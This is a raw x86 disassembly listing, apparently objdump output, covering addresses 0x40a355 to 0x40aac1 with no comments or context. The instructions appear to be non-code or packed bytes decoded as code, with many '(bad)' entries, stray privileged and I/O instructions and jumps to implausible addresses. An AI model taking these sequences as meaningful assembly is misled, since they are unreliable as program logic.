  40a355:	sbb    al,0xe2
  40a357:	test   al,0x58
  40a359:	sub    edi,DWORD PTR [esi+ecx*8]
  40a35c:	add    DWORD PTR [ecx],0x8520c83a
  40a362:	push   esi
  40a363:	lds    ebx,FWORD PTR [eax+edi*1]
  40a366:	shl    BYTE PTR [ecx+0x7fa64f57],0x67
  40a36d:	jl     0x40a3ae
  40a36f:	dec    esp
  40a370:	add    DWORD PTR [ebx-0xe1e9ff0],ecx
  40a376:	test   al,0x6b
  40a378:	ret    0xbed6
  40a37b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a37c:	sub    BYTE PTR [esi-0x316b8e5d],0x48
  40a383:	adc    BYTE PTR [ebp+edx*4-0x24],ch
  40a387:	and    BYTE PTR ds:0x6b59d6f3,dl
  40a38d:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40a38f:	mov    esi,0x3cc2be
  40a394:	adc    ch,dh
  40a396:	push   edx
  40a397:	sbb    dh,cl
  40a399:	jo     0x40a369
  40a39b:	pop    DWORD PTR [esi-0x5e]
  40a39e:	mov    ecx,DWORD PTR [ebp+0x15]
  40a3a1:	xor    ebp,DWORD PTR [edi+esi*8-0x54ab9cb2]
  40a3a8:	add    al,0xc9
  40a3aa:	xor    al,0xf2
  40a3ac:	hlt    
  40a3ad:	inc    ecx
  40a3ae:	cmp    cl,BYTE PTR [ecx-0x13]
  40a3b1:	jp     0x40a3c8
  40a3b3:	imul   edi,ecx,0xc220c9c1
  40a3b9:	jnp    0x40a359
  40a3bb:	fldcw  WORD PTR [esi-0x1f42945f]
  40a3c1:	stos   DWORD PTR es:[edi],eax
  40a3c2:	push   cs
  40a3c3:	imul   DWORD PTR [ebx-0x31b512e]
  40a3c9:	xchg   esp,eax
  40a3ca:	sti    
  40a3cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3cc:	jmp    0xc906e839
  40a3d1:	dec    eax
  40a3d2:	out    0x5f,eax
  40a3d4:	rcr    bx,0xb2
  40a3d8:	fisub  WORD PTR [eax]
  40a3da:	jnp    0x40a38e
  40a3dc:	inc    esp
  40a3dd:	dec    edi
  40a3de:	mul    DWORD PTR [ebx]
  40a3e0:	and    DWORD PTR [eax+0x744790c4],esi
  40a3e6:	adc    eax,0xa59a70d8
  40a3eb:	hlt    
  40a3ec:	in     al,0x91
  40a3ee:	xchg   ebp,eax
  40a3ef:	sub    DWORD PTR [esi+ebp*8+0x57],0x20a0676a
  40a3f7:	mov    edx,0x87293142
  40a3fc:	sub    DWORD PTR ds:0xd5daaf9a,0x43
  40a403:	and    edx,DWORD PTR [ecx+0x4d]
  40a406:	ret    0x8262
  40a409:	sbb    edx,DWORD PTR [ecx+0x501e959a]
  40a40f:	jo     0x40a3d9
  40a411:	pop    edx
  40a412:	or     al,0x50
  40a414:	ds mov edx,0xc5471a79
  40a41a:	dec    edx
  40a41b:	mov    edx,0xc9c219a6
  40a420:	(bad)  
  40a421:	lds    esp,FWORD PTR [edi+0x68546464]
  40a427:	mov    ebp,0xd502e34c
  40a42c:	fdiv   st,st(6)
  40a42e:	push   ds
  40a42f:	inc    edi
  40a430:	push   edi
  40a431:	pop    esi
  40a432:	xor    eax,0x56cddaa4
  40a437:	xchg   esi,eax
  40a438:	out    dx,al
  40a439:	cmp    eax,ecx
  40a43b:	lea    edi,gs:[edi-0x52]
  40a43f:	push   ecx
  40a440:	push   esi
  40a441:	test   DWORD PTR ss:[edi-0x24a93c64],0xcc31e1ae
  40a44c:	cld    
  40a44d:	pushf  
  40a44e:	es je  0x40a430
  40a451:	xlat   BYTE PTR ds:[ebx]
  40a452:	adc    eax,0x720f740b
  40a457:	and    eax,0x38c5d35e
  40a45c:	mov    ds:0xd7d7fa5d,al
  40a461:	sar    esp,cl
  40a463:	hlt    
  40a464:	push   ebx
  40a465:	xlat   BYTE PTR ds:[ebx]
  40a466:	(bad)  
  40a467:	push   0xa133171
  40a46c:	ss leave 
  40a46e:	and    al,0x73
  40a470:	and    esi,DWORD PTR [ebx+edi*8]
  40a473:	repz dec eax
  40a475:	lods   al,BYTE PTR ds:[esi]
  40a476:	cmp    eax,DWORD PTR [ecx]
  40a478:	sub    al,0x4e
  40a47a:	rol    edx,cl
  40a47c:	test   ah,bl
  40a47e:	(bad)  
  40a47f:	cwde   
  40a480:	dec    edi
  40a481:	mov    eax,ds:0x82b6329c
  40a486:	mov    eax,ds:0x5bc35b9d
  40a48b:	xchg   esi,eax
  40a48c:	and    al,0x68
  40a48e:	mov    WORD PTR [ebx+0xef784ab],ds
  40a494:	mov    al,0x26
  40a496:	jecxz  0x40a495
  40a498:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a499:	mov    edi,0x7ca96fa5
  40a49e:	jno    0x40a44e
  40a4a0:	out    dx,al
  40a4a1:	test   al,0xe6
  40a4a3:	shl    DWORD PTR ds:0x3754df7a,0xe8
  40a4aa:	jno    0x40a42e
  40a4ac:	xor    BYTE PTR ds:0x5a2ef599,0x34
  40a4b3:	aas    
  40a4b4:	dec    ebp
  40a4b5:	aad    0xa6
  40a4b7:	push   edx
  40a4b8:	das    
  40a4b9:	arpl   bx,si
  40a4bb:	cmp    DWORD PTR [eax-0x52],ebp
  40a4be:	cmp    eax,0x2c15314f
  40a4c3:	cmp    DWORD PTR [esi-0xf],0x3d
  40a4c7:	pop    ss
  40a4c8:	mov    dh,0x35
  40a4ca:	pop    ecx
  40a4cb:	imul   ebx,eax,0xffffffbf
  40a4ce:	or     eax,0xf1a7e12d
  40a4d3:	outs   dx,BYTE PTR ds:[esi]
  40a4d4:	call   0x8f8e2a76
  40a4d9:	popa   
  40a4da:	retf   
  40a4db:	ins    DWORD PTR es:[edi],dx
  40a4dc:	xor    bl,0x7e
  40a4df:	adc    ah,BYTE PTR [edx]
  40a4e1:	push   0x2
  40a4e3:	fnstsw WORD PTR [ebp+0x54db6b23]
  40a4e9:	dec    esi
  40a4ea:	jo     0x40a52e
  40a4ec:	xor    al,0xf0
  40a4ee:	cmp    dh,bl
  40a4f0:	loop   0x40a4d7
  40a4f2:	xor    ebp,edi
  40a4f4:	jl     0x40a536
  40a4f6:	jmp    0x4c643519
  40a4fb:	les    ebx,FWORD PTR [ecx+ebp*8]
  40a4fe:	and    eax,0xdac33971
  40a503:	jecxz  0x40a54c
  40a505:	cdq    
  40a506:	and    DWORD PTR [ebp+0x4d5b6603],0xffffff81
  40a50d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a50e:	jo     0x40a552
  40a510:	loopne 0x40a4b9
  40a512:	dec    esp
  40a513:	sahf   
  40a514:	jns    0x40a4df
  40a516:	jmp    0x976bbb87
  40a51b:	mov    edi,0xcf60504d
  40a520:	popa   
  40a521:	(bad)  [ebp+0x475e97d9]
  40a527:	fmul   st(5),st
  40a529:	je     0x40a55b
  40a52b:	push   eax
  40a52c:	leave  
  40a52d:	mov    edx,0xea977665
  40a532:	iret   
  40a533:	sub    ah,BYTE PTR [ebx+0x4108be41]
  40a539:	cmp    dh,BYTE PTR [edx+0x6]
  40a53c:	inc    edi
  40a53d:	mov    ds:0x38bea218,eax
  40a542:	jbe    0x40a547
  40a544:	xchg   ebp,eax
  40a545:	aas    
  40a546:	cmp    al,0x77
  40a548:	or     BYTE PTR [edx+0x1f],bl
  40a54b:	retf   0x6cea
  40a54e:	mov    ecx,0xc170e60
  40a553:	outs   dx,DWORD PTR ds:[esi]
  40a554:	stc    
  40a555:	dec    edi
  40a556:	imul   eax,esi,0x7e4eb01e
  40a55c:	into   
  40a55d:	cmp    BYTE PTR [eax+0x54fac9ef],cl
  40a563:	pop    ebp
  40a564:	jmp    0xf6d:0x7ef22515
  40a56b:	iret   
  40a56c:	(bad)  
  40a56d:	cld    
  40a56e:	cli    
  40a56f:	mov    dh,0xd5
  40a571:	mov    ebp,0x3766b098
  40a576:	inc    ecx
  40a577:	inc    esp
  40a578:	mov    dl,0x68
  40a57a:	int    0x6e
  40a57c:	mov    bl,0xbd
  40a57e:	ror    BYTE PTR ds:0x27c5846c,1
  40a584:	add    ch,BYTE PTR [edi-0x7bdb61ab]
  40a58a:	sar    BYTE PTR [ebp-0x4ef2db8f],cl
  40a590:	sub    eax,0x88b73161
  40a595:	xchg   BYTE PTR [ebx],cl
  40a597:	or     eax,0x21a5b40a
  40a59c:	adc    eax,0x7f2bd203
  40a5a1:	outs   dx,DWORD PTR ds:[esi]
  40a5a2:	getsec 
  40a5a4:	push   ecx
  40a5a5:	xchg   edi,eax
  40a5a6:	sbb    al,0x70
  40a5a8:	lods   al,BYTE PTR ds:[esi]
  40a5a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5aa:	out    0xee,eax
  40a5ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5ad:	jo     0x40a606
  40a5af:	push   ds
  40a5b0:	cmp    BYTE PTR [ebp-0x545da4ca],ch
  40a5b6:	popf   
  40a5b7:	cld    
  40a5b8:	in     al,dx
  40a5b9:	loop   0x40a604
  40a5bb:	xor    bl,BYTE PTR [edx]
  40a5bd:	shl    BYTE PTR [eax],0xd8
  40a5c0:	jge    0x40a55e
  40a5c2:	sbb    al,0x5
  40a5c4:	in     al,dx
  40a5c5:	int    0x9d
  40a5c7:	and    BYTE PTR [eax],al
  40a5c9:	mov    BYTE PTR [ebx],al
  40a5cb:	(bad)  [ebx+0x267fb04f]
  40a5d1:	cld    
  40a5d2:	cwde   
  40a5d3:	mov    ah,0x42
  40a5d5:	popa   
  40a5d6:	xchg   esp,eax
  40a5d7:	(bad)  
  40a5d8:	out    dx,eax
  40a5d9:	in     al,0xae
  40a5db:	inc    edx
  40a5dc:	mov    bh,0xbc
  40a5de:	sbb    BYTE PTR [ebx+0x12],ah
  40a5e1:	adc    cl,BYTE PTR [ebp+0x6e2e5c6d]
  40a5e7:	ret    
  40a5e8:	dec    edx
  40a5e9:	inc    edi
  40a5ea:	mov    edx,0x9dd4224d
  40a5ef:	inc    ebp
  40a5f0:	scas   al,BYTE PTR es:[edi]
  40a5f1:	gs (bad) 
  40a5f3:	div    DWORD PTR [edx-0x539e87fd]
  40a5f9:	mov    ecx,0x69d8c1b8
  40a5fe:	aad    0x58
  40a600:	cmp    DWORD PTR [ecx],edi
  40a602:	mov    al,ds:0xff4dfb3
  40a607:	and    DWORD PTR [esp+edi*8],esi
  40a60a:	lahf   
  40a60b:	sub    al,0x1b
  40a60d:	sbb    bh,BYTE PTR [eax-0xc]
  40a610:	not    DWORD PTR [ebp+ecx*2-0x5774e33c]
  40a617:	sbb    DWORD PTR [ebx-0x35701d86],esi
  40a61d:	sahf   
  40a61e:	inc    esi
  40a61f:	sbb    al,0x86
  40a621:	fstp   DWORD PTR [ecx-0x28]
  40a624:	mov    edx,DWORD PTR [edi-0x1d]
  40a627:	imul   ebp,ecx,0x25
  40a62a:	mov    ah,0x5d
  40a62c:	mov    al,ds:0x64309d5a
  40a631:	retf   
  40a632:	dec    ebp
  40a633:	cmp    DWORD PTR [edx-0x34ed7fc8],ebx
  40a639:	in     al,dx
  40a63a:	lea    esi,[ebx]
  40a63c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a63d:	(bad)
  40a641:	pop    ebx
  40a642:	add    bl,dh
  40a644:	xor    esp,DWORD PTR [esi-0x4e2640f]
  40a64a:	addr16 call 0x11f50553
  40a650:	les    edi,FWORD PTR [ebx+0x588be622]
  40a656:	adc    edx,DWORD PTR [edx]
  40a658:	in     eax,0x95
  40a65a:	arpl   WORD PTR [eax+0x3a],ax
  40a65d:	leave  
  40a65e:	cld    
  40a65f:	mov    esi,0x50dead89
  40a664:	loope  0x40a6ba
  40a666:	sbb    DWORD PTR [ebp+0x2477bdbf],eax
  40a66c:	add    bh,ch
  40a66e:	aam    0xec
  40a670:	and    ebx,0x3701b5e8
  40a676:	jecxz  0x40a635
  40a678:	pop    esi
  40a679:	mov    dh,0x1e
  40a67b:	rol    esi,0x74
  40a67e:	aad    0xd3
  40a680:	nop
  40a681:	gs inc ecx
  40a683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a684:	(bad)  
  40a685:	add    eax,0xdfe64b7d
  40a68a:	adc    edi,ebp
  40a68c:	sub    eax,0x33bfdab2
  40a691:	jmp    0x2b9d06da
  40a696:	inc    edi
  40a697:	adc    edi,DWORD PTR [esi]
  40a699:	xor    BYTE PTR [ebx+edx*4],0x9c
  40a69d:	dec    ebp
  40a69e:	ret    0xaf34
  40a6a1:	xchg   DWORD PTR [esi+0x21],ecx
  40a6a4:	das    
  40a6a5:	loopne 0x40a6ad
  40a6a7:	dec    edi
  40a6a8:	(bad)  
  40a6a9:	das    
  40a6aa:	pushf  
  40a6ab:	inc    ebp
  40a6ac:	jl     0x40a640
  40a6ae:	lds    ebx,FWORD PTR [ebp-0x459a423]
  40a6b4:	adc    DWORD PTR [ebp+esi*8+0x5a318401],0xfffffff7
  40a6bc:	sbb    DWORD PTR [eax+0x26786317],ebx
  40a6c2:	pop    es
  40a6c3:	pop    edx
  40a6c4:	xchg   cl,bh
  40a6c6:	mov    edx,0x1b197ad2
  40a6cb:	xchg   esi,eax
  40a6cc:	jp     0x40a6e9
  40a6ce:	dec    edx
  40a6cf:	ss push 0xe32498ab
  40a6d5:	push   esi
  40a6d6:	and    eax,0xfe75dcc
  40a6db:	sbb    DWORD PTR [esi+0x1a],edi
  40a6de:	push   ebx
  40a6df:	adc    ch,BYTE PTR [esi+ebp*4]
  40a6e2:	dec    edx
  40a6e3:	push   ebx
  40a6e4:	xlat   BYTE PTR ds:[ebx]
  40a6e5:	mov    esi,0x578e6a00
  40a6ea:	test   eax,0xa1de9d40
  40a6ef:	or     eax,0xccf165c7
  40a6f4:	ins    DWORD PTR es:[edi],dx
  40a6f5:	cmp    DWORD PTR [esi+0x25],0x79
  40a6f9:	dec    ebp
  40a6fa:	sbb    ah,BYTE PTR ds:0xe9b73e9f
  40a700:	mov    ebx,0xcd869035
  40a705:	jnp    0x40a715
  40a707:	push   ebp
  40a708:	pop    ebp
  40a709:	repnz inc eax
  40a70b:	scas   al,BYTE PTR es:[edi]
  40a70c:	mov    edx,0xf715a28b
  40a711:	retf   0xd757
  40a714:	ror    BYTE PTR [ebp-0x6f43e40c],1
  40a71a:	in     eax,0xc0
  40a71c:	cmp    al,0xad
  40a71e:	lods   al,BYTE PTR ds:[esi]
  40a71f:	mov    al,ds:0x94139f4a
  40a724:	add    ecx,eax
  40a726:	ins    DWORD PTR es:[edi],dx
  40a727:	sbb    eax,0xb7509ff1
  40a72c:	out    dx,al
  40a72d:	fimul  DWORD PTR [ebp-0x38]
  40a730:	les    edx,FWORD PTR [ebx+0x4f9431bd]
  40a736:	test   al,0x50
  40a738:	push   ds
  40a739:	in     eax,0x3
  40a73b:	sub    BYTE PTR [ebx+0x506a7dd3],0x6a
  40a742:	and    DWORD PTR [eax],edi
  40a744:	cmp    esp,DWORD PTR [eax-0x11]
  40a747:	mov    DWORD PTR [eax-0x33],edi
  40a74a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a74b:	pop    edi
  40a74c:	leave  
  40a74d:	jmp    0x40a6f3
  40a74f:	xchg   edi,eax
  40a750:	cdq    
  40a751:	stos   DWORD PTR es:[edi],eax
  40a752:	add    ah,BYTE PTR [esi]
  40a754:	(bad)  
  40a755:	rol    eax,1
  40a757:	and    BYTE PTR [esi+0xf],bh
  40a75a:	mov    ebx,0xa5273deb
  40a75f:	mov    cl,0xdd
  40a761:	jmp    0x7340:0x2451ea6a
  40a768:	cmp    DWORD PTR [edi],esi
  40a76a:	adc    DWORD PTR ds:0x8e60e041,esi
  40a770:	pop    es
  40a771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a772:	aam    0xe6
  40a774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a775:	push   ebx
  40a776:	cmp    ebp,edi
  40a778:	ds sti 
  40a77a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a77b:	sahf   
  40a77c:	test   DWORD PTR [esi],eax
  40a77e:	adc    dl,al
  40a780:	adc    edi,DWORD PTR [edx+0x56185528]
  40a786:	mov    ch,BYTE PTR [ebx-0x5011adb2]
  40a78c:	inc    esp
  40a78d:	xor    dl,0x8b
  40a790:	dec    ebp
  40a791:	lock mov edx,DWORD PTR [ebp-0xc]
  40a795:	xor    eax,edi
  40a797:	shl    ecx,0x1e
  40a79a:	mov    ecx,DWORD PTR [ebp-0x14]
  40a79d:	xor    edx,edx
  40a79f:	or     eax,edx
  40a7a1:	mov    cl,BYTE PTR [eax+ecx*1]
  40a7a4:	mov    eax,DWORD PTR [ebp-0x34]
  40a7a7:	jmp    0x40ad31
  40a7ac:	inc    ebx
  40a7ad:	dec    esi
  40a7ae:	aad    0x8e
  40a7b0:	fcom   DWORD PTR [eax+ebx*1]
  40a7b3:	inc    edx
  40a7b4:	loop   0x40a7dd
  40a7b6:	ds push 0xa842c4f1
  40a7bc:	or     ax,0x1616
  40a7c0:	cmp    eax,0x70161604
  40a7c5:	push   es
  40a7c6:	pop    ds
  40a7c7:	pop    ds
  40a7c8:	bound  ecx,QWORD PTR [edi-0x17d14c27]
  40a7ce:	in     eax,dx
  40a7cf:	mov    dh,0xc6
  40a7d1:	loop   0x40a816
  40a7d3:	stos   DWORD PTR es:[edi],eax
  40a7d4:	shl    al,0xab
  40a7d7:	cmp    eax,esp
  40a7d9:	mov    dl,0x8a
  40a7db:	push   ebp
  40a7dc:	outs   dx,DWORD PTR ds:[esi]
  40a7dd:	or     al,dl
  40a7df:	sub    esi,edi
  40a7e1:	fidiv  WORD PTR [esi+edx*8+0x4cd31b55]
  40a7e8:	sub    BYTE PTR [ebx+esi*8],dl
  40a7eb:	and    ecx,DWORD PTR [edx]
  40a7ed:	fnsave [ecx+0x5c]
  40a7f0:	mov    eax,ds:0x7ab656aa
  40a7f5:	sbb    DWORD PTR [ebp+0x46],0xd64ed308
  40a7fc:	push   0xffffffcb
  40a7fe:	fwait
  40a7ff:	int3   
  40a800:	jbe    0x40a78c
  40a802:	or     bl,BYTE PTR [ecx]
  40a804:	push   edi
  40a805:	std    
  40a806:	push   edi
  40a807:	rol    DWORD PTR [edi-0x33],0x23
  40a80b:	and    DWORD PTR [esi+0x72],0xb4069278
  40a812:	(bad)  
  40a813:	sbb    BYTE PTR [ecx-0x3926e54f],ah
  40a819:	add    DWORD PTR [ecx+0x51],eax
  40a81c:	jno    0x40a840
  40a81e:	ss dec edx
  40a820:	pop    ebp
  40a821:	(bad)  
  40a822:	cmp    BYTE PTR [eax],bl
  40a824:	aam    0x11
  40a826:	sub    eax,0x708af243
  40a82b:	xor    BYTE PTR [ebx+ebx*4-0x1dcdf978],cl
  40a832:	rol    BYTE PTR [ecx-0x40],1
  40a835:	or     cl,BYTE PTR [edi-0x6bc565b3]
  40a83b:	xchg   esp,edi
  40a83d:	xchg   ecx,eax
  40a83e:	adc    edi,DWORD PTR [edi]
  40a840:	lds    eax,FWORD PTR [esi]
  40a842:	xchg   esi,eax
  40a843:	dec    edx
  40a844:	push   ebp
  40a845:	push   0xf188e087
  40a84a:	mov    WORD PTR [edx+ebx*1-0x6a],gs
  40a84e:	inc    edx
  40a84f:	xchg   ebp,eax
  40a850:	mov    edi,DWORD PTR [edi-0x31]
  40a853:	outs   dx,BYTE PTR ds:[esi]
  40a854:	pop    ecx
  40a855:	xchg   ebp,eax
  40a856:	lahf   
  40a857:	test   DWORD PTR [edi+ebp*8],0x3f69f764
  40a85e:	and    eax,0xe7feb77b
  40a863:	daa    
  40a864:	mov    ds,WORD PTR [ebx-0xc18edf5]
  40a86a:	(bad)  
  40a86b:	lods   al,BYTE PTR ds:[esi]
  40a86c:	dec    ebp
  40a86d:	or     BYTE PTR [esi-0x14d98cb],dh
  40a873:	and    eax,0x75cf2e2c
  40a878:	push   edi
  40a879:	mov    dh,0xca
  40a87b:	ja     0x40a8e5
  40a87d:	hlt    
  40a87e:	pusha  
  40a87f:	popf   
  40a880:	loopne 0x40a8aa
  40a882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a883:	xchg   DWORD PTR [edi-0x54],ecx
  40a886:	push   cs
  40a887:	scas   eax,DWORD PTR es:[edi]
  40a888:	out    dx,al
  40a889:	enter  0xd626,0x6b
  40a88d:	cmp    ecx,0xa11585a9
  40a893:	in     eax,0xce
  40a895:	adc    al,0xd1
  40a897:	in     al,dx
  40a898:	(bad)  
  40a899:	rcr    BYTE PTR [ebp-0x8],cl
  40a89c:	leave  
  40a89d:	sbb    dl,BYTE PTR [ebx]
  40a89f:	push   ecx
  40a8a0:	xchg   esi,eax
  40a8a1:	jns    0x40a8cf
  40a8a3:	jns    0x40a924
  40a8a5:	and    al,0x2
  40a8a7:	mov    ecx,0x532d952d
  40a8ac:	add    DWORD PTR [esi-0x746ad573],0x113088fc
  40a8b6:	(bad)  
  40a8b7:	in     al,0x1d
  40a8b9:	retf   
  40a8ba:	test   al,0x91
  40a8bc:	pop    ss
  40a8bd:	daa    
  40a8be:	inc    eax
  40a8bf:	add    eax,DWORD PTR [ebx+0x3115c040]
  40a8c5:	retf   
  40a8c6:	and    al,0x6b
  40a8c8:	cdq    
  40a8c9:	mov    edx,0x4b0a09d
  40a8ce:	bound  esp,QWORD PTR [ecx-0x7a]
  40a8d1:	lods   eax,DWORD PTR ds:[esi]
  40a8d2:	loope  0x40a90e
  40a8d4:	sbb    eax,0x5467796e
  40a8d9:	push   ss
  40a8da:	xor    dh,BYTE PTR [ebx]
  40a8dc:	ss adc al,dl
  40a8df:	pusha  
  40a8e0:	lock and eax,0x4dc56c29
  40a8e6:	pop    esp
  40a8e7:	xchg   BYTE PTR [edx+0x1632c488],al
  40a8ed:	cmp    ecx,ecx
  40a8ef:	pushf  
  40a8f0:	icebp  
  40a8f1:	pandn  mm2,mm2
  40a8f4:	xchg   ebp,eax
  40a8f5:	sub    bl,ch
  40a8f7:	fwait
  40a8f8:	inc    esp
  40a8f9:	cs mov eax,0xba8ef0a2
  40a8ff:	and    dh,dh
  40a901:	xor    al,0xe7
  40a903:	push   ecx
  40a904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a905:	fnstsw WORD PTR [edi+0x43]
  40a908:	pushf  
  40a909:	xchg   BYTE PTR [ebp+0x7ebe51f],ch
  40a90f:	das    
  40a910:	hlt    
  40a911:	sub    BYTE PTR [ecx-0x655d37bd],bh
  40a917:	(bad)  
  40a918:	pop    ebx
  40a919:	aaa    
  40a91a:	pop    eax
  40a91b:	bound  edx,QWORD PTR [eax+ebx*2]
  40a91e:	outs   dx,BYTE PTR ds:[esi]
  40a91f:	shr    ebx,cl
  40a921:	jg     0x40a948
  40a923:	inc    ebx
  40a924:	add    ah,dh
  40a926:	pushf  
  40a927:	cmp    WORD PTR [esi],dx
  40a92a:	mov    bl,0xb
  40a92c:	cmp    cl,BYTE PTR [ebp+0x2c]
  40a92f:	stos   BYTE PTR es:[edi],al
  40a930:	push   ds
  40a931:	int3   
  40a932:	add    ah,BYTE PTR [edi-0x2ce8e263]
  40a938:	jl     0x40a8cb
  40a93a:	and    BYTE PTR [ebx+0x11dfd616],ah
  40a940:	jb     0x40a8d8
  40a942:	test   DWORD PTR ds:0xc281bfd6,esp
  40a948:	aam    0xfa
  40a94a:	call   0x2b1f4161
  40a94f:	pop    es
  40a950:	xlat   BYTE PTR ds:[ebx]
  40a951:	xchg   ecx,eax
  40a952:	inc    ebx
  40a953:	xor    DWORD PTR [edx],0x911fbd7b
  40a959:	xchg   ebp,eax
  40a95a:	outs   dx,DWORD PTR ds:[esi]
  40a95b:	or     DWORD PTR [edi+eiz*8-0x18af97e3],eax
  40a962:	mov    WORD PTR [esi],gs
  40a964:	bound  eax,QWORD PTR ds:0x332e6963
  40a96a:	cmp    eax,0x28341f6e
  40a96f:	imul   ebp,eax,0x3f9d121e
  40a975:	inc    eax
  40a976:	xchg   ebx,eax
  40a977:	xor    al,0x96
  40a979:	aaa    
  40a97a:	sub    DWORD PTR [edx-0x51],esi
  40a97d:	out    0x26,al
  40a97f:	ja     0x40a9b9
  40a981:	(bad)  
  40a982:	mov    al,ds:0x1fc24b30
  40a987:	sbb    al,0xc
  40a989:	fwait
  40a98a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a98b:	mov    edx,0x732f6799
  40a990:	xor    esp,DWORD PTR [ebp-0x5ef9ea06]
  40a996:	out    0xc0,eax
  40a998:	loopne 0x40a936
  40a99a:	inc    esp
  40a99b:	add    DWORD PTR [edi-0x8],0xaa6d9227
  40a9a2:	jp     0x40a99a
  40a9a4:	add    al,0x78
  40a9a6:	pop    edx
  40a9a7:	bound  ecx,QWORD PTR [eax]
  40a9a9:	outs   dx,DWORD PTR ds:[esi]
  40a9aa:	inc    ebp
  40a9ab:	data16 repnz adc BYTE PTR [ebx],dh
  40a9af:	mov    fs,WORD PTR [ecx]
  40a9b1:	and    al,0x16
  40a9b3:	sahf   
  40a9b4:	jo     0x40aa15
  40a9b6:	out    dx,al
  40a9b7:	ja     0x40a9ab
  40a9b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9ba:	mov    BYTE PTR [ecx],dh
  40a9bc:	mov    dh,0x5f
  40a9be:	stos   BYTE PTR es:[edi],al
  40a9bf:	sub    eax,0x71caf17a
  40a9c4:	ins    BYTE PTR es:[edi],dx
  40a9c5:	xor    eax,0xfc94d750
  40a9ca:	dec    eax
  40a9cb:	and    eax,0xf22c710d
  40a9d0:	pushf  
  40a9d1:	(bad)  
  40a9d2:	dec    ecx
  40a9d3:	pop    ss
  40a9d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9d5:	inc    ecx
  40a9d6:	shr    ebp,0x8c
  40a9d9:	lock fdivr st,st(2)
  40a9dc:	pop    edi
  40a9dd:	(bad)  
  40a9de:	out    dx,eax
  40a9df:	ds xor al,0x9b
  40a9e2:	call   DWORD PTR [edx-0x9]
  40a9e5:	inc    dl
  40a9e7:	rcr    bh,cl
  40a9e9:	leave  
  40a9ea:	adc    eax,0xde217105
  40a9ef:	aad    0xfd
  40a9f1:	imul   edi,edx,0xffffffde
  40a9f4:	push   es
  40a9f5:	iret   
  40a9f6:	cli    
  40a9f7:	push   eax
  40a9f8:	jnp    0x40aa49
  40a9fa:	pop    ds
  40a9fb:	gs pop ecx
  40a9fd:	adc    DWORD PTR [esi+ebx*8],ebx
  40aa00:	adc    dh,BYTE PTR [esi-0x27c7f34b]
  40aa06:	inc    esi
  40aa07:	das    
  40aa08:	mov    ?,edi
  40aa0a:	add    DWORD PTR [eax],esi
  40aa0c:	ins    DWORD PTR es:[edi],dx
  40aa0d:	popf   
  40aa0e:	jnp    0x40a9a8
  40aa10:	sub    al,0x5c
  40aa12:	cld    
  40aa13:	jmp    0x9748:0xea21146d
  40aa1a:	jae    0x40a9c9
  40aa1c:	and    al,0x4d
  40aa1e:	pop    edi
  40aa1f:	sub    cl,dh
  40aa21:	add    DWORD PTR [edx],ecx
  40aa23:	lock jo 0x40aa51
  40aa26:	cmp    al,0xc5
  40aa28:	test   al,0x18
  40aa2a:	fimul  DWORD PTR [edi-0x39]
  40aa2d:	dec    esp
  40aa2e:	push   ss
  40aa2f:	lds    esi,FWORD PTR [edi]
  40aa31:	cmp    eax,0xb7d5f370
  40aa36:	sbb    DWORD PTR [ebx],esi
  40aa38:	mov    dl,0x2
  40aa3a:	les    esi,FWORD PTR [ecx-0x186da4d2]
  40aa40:	pusha  
  40aa41:	ins    BYTE PTR es:[edi],dx
  40aa42:	ja     0x40aa0b
  40aa44:	lds    edx,FWORD PTR [esp+ebx*8]
  40aa47:	lea    ebp,[edi+0x24]
  40aa4a:	test   edx,ebx
  40aa4c:	add    al,0x28
  40aa4e:	sub    DWORD PTR [edi+edi*1+0x3890ba5e],ebp
  40aa55:	mov    dl,0xb5
  40aa57:	sbb    esp,DWORD PTR [eax-0x40]
  40aa5a:	and    eax,0xba4deef
  40aa5f:	adc    DWORD PTR [ebx+ebx*8],esi
  40aa62:	sbb    DWORD PTR [edi+0x69],edx
  40aa65:	lea    ebp,[ecx]
  40aa67:	sti    
  40aa68:	cwde   
  40aa69:	pop    esp
  40aa6a:	cmp    eax,0x2caec5e9
  40aa6f:	fisttp DWORD PTR [eax-0x64aa6b29]
  40aa75:	cmp    edi,DWORD PTR [esi+0x23084641]
  40aa7b:	jg     0x40aa08
  40aa7d:	jp     0x40aa2b
  40aa7f:	xor    BYTE PTR [eax+0x4e],cl
  40aa82:	fldenv [ebp+0x1f]
  40aa85:	(bad)  
  40aa86:	js     0x40aa86
  40aa88:	or     ah,bl
  40aa8a:	stos   DWORD PTR es:[edi],eax
  40aa8b:	dec    ecx
  40aa8c:	in     al,0xca
  40aa8e:	imul   ebp,DWORD PTR [eax],0xe43d4f6c
  40aa94:	jne    0x40aaf2
  40aa96:	inc    esp
  40aa97:	sbb    eax,0xf4ebd1f8
  40aa9c:	sub    BYTE PTR [ebx-0x312ab7e0],bl
  40aaa2:	idiv   DWORD PTR [eax]
  40aaa4:	jno    0x40aa57
  40aaa6:	(bad)  
  40aaa7:	ficomp WORD PTR [esi+0x599bf6a1]
  40aaad:	pop    bx
  40aaaf:	mov    al,0xd
  40aab1:	pusha  
  40aab2:	mov    dl,0x5f
  40aab4:	jbe    0x40aa5d
  40aab6:	adc    ebx,DWORD PTR [edi+0x12]
  40aab9:	xchg   DWORD PTR ds:0x804ae60,ebp
  40aabf:	or     BYTE PTR [eax],cl
  40aac1:	cmp    ah,BYTE PTR [ebx-0x7cf47d24]
